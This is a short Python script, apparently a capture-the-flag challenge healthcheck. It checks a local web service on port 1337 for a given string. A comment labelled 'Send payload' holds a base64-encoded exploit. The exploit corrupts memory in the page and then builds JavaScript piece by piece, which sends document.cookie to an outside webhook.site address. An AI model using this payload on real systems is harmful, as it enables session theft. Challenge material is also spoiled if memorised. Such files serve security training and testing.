#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes
import requests

r = requests.get('http://localhost:1337')
if 'Found an issue?' in r.text:
    exit(0)
exit(1)

# Send payload W1swLCAwLCAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiXSwgWzAsIDEsICJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCIl0sIFswLCAyLCAiQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQyJdLCBbMCwgMywgIk09SEVBUDg7QT02NjEyODtNW0FdPTA7Il0sIFswLCA0LCAiRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRSJdLCBbMSwgMl0sIFsyLCAyLCAiUlx1MDAwMlx1MDAwMSJdLCBbMSwgMV0sIFsyLCAwLCAiXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzXHUwMDAzIl0sIFszLCAzXSwgWzIsIDMsICJNW0FdPTA7Qj1cImxvY2F0aW9uPScvL1wiIl0sIFszLCAzXSwgWzIsIDMsICJNW0FdPTA7Qis9XCJ3ZWJob29rLnNpXCIiXSwgWzMsIDNdLCBbMiwgMywgIk1bQV09MDtCKz1cInRlLzIxN2YzYTk0XCIiXSwgWzMsIDNdLCBbMiwgMywgIk1bQV09MDtCKz1cIi1mNTEzLTQ5NzQtXCIiXSwgWzMsIDNdLCBbMiwgMywgIk1bQV09MDtCKz1cImE1YzUtM2FjN2VkXCIiXSwgWzMsIDNdLCBbMiwgMywgIk1bQV09MDtCKz1cImQ2OWQ0Mi8nK2RvXCIiXSwgWzMsIDNdLCBbMiwgMywgIk1bQV09MDtCKz1cImN1bWVudC5jb29rXCIiXSwgWzMsIDNdLCBbMiwgMywgIk1bQV09MDtldmFsKEIrXCJpZVwiKSJdLCBbMywgM11d